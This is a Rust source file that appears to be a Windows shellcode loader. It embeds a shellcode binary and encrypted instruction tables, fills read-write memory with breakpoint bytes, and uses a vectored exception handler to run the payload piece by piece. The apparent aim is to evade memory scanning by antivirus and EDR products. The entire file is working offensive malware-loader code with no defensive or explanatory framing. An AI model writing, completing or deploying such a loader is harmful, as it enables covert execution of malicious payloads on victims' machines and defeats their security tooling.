mod utils;

use crate::utils::{intercept_shellcode_exception, resolve_end_of_text_segment};
use std::ffi::{c_uchar, c_void};
use std::mem::transmute;
use std::ops::Not;
use std::ptr::{null, null_mut};
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, RemoveVectoredExceptionHandler,
};
use windows_sys::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, PAGE_READWRITE};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};

static mut INFO: Phantom = Phantom::default_const();

#[derive(Debug, Default, Copy, Clone)]
struct CryptBytesQuota {
    rva: usize,
    quota: usize,
}

#[derive(Debug)]
struct Phantom {
    allocation_base: *mut c_void,
    previous_instruction: *mut c_void,
    sh: Vec<u8>,
    instruction: Vec<CryptBytesQuota>,
}

impl Phantom {
    const fn default_const() -> Self {
        Self {
            allocation_base: null_mut(),
            previous_instruction: null_mut(),
            sh: vec![],
            instruction: vec![],
        }
    }
}

fn main() {
    unsafe {
        let shellcode: &[u8] = include_bytes!("../assets/shellcode.bin");
        INFO.sh = Vec::from(shellcode);
        include!("../assets/sh");

        let mut c = CryptBytesQuota::default();
        include!("../assets/in");

        INFO.allocation_base = VirtualAlloc(null(), INFO.sh.len(), MEM_COMMIT, PAGE_READWRITE);

        if INFO.allocation_base.is_null().not() {
            for i in 0..=INFO.sh.len() {
                *(((INFO.allocation_base as usize) + i) as *mut c_uchar) = 0xcc;
            }

            let h_thread = CreateThread(
                null(),
                0,
                transmute(resolve_end_of_text_segment()),
                null(),
                0,
                null_mut(),
            );
            if h_thread != 0 {
                AddVectoredExceptionHandler(1, Some(intercept_shellcode_exception));
                WaitForSingleObject(h_thread, INFINITE);
                RemoveVectoredExceptionHandler(intercept_shellcode_exception as *mut c_void);
                CloseHandle(h_thread);
            }
        }
    }
}
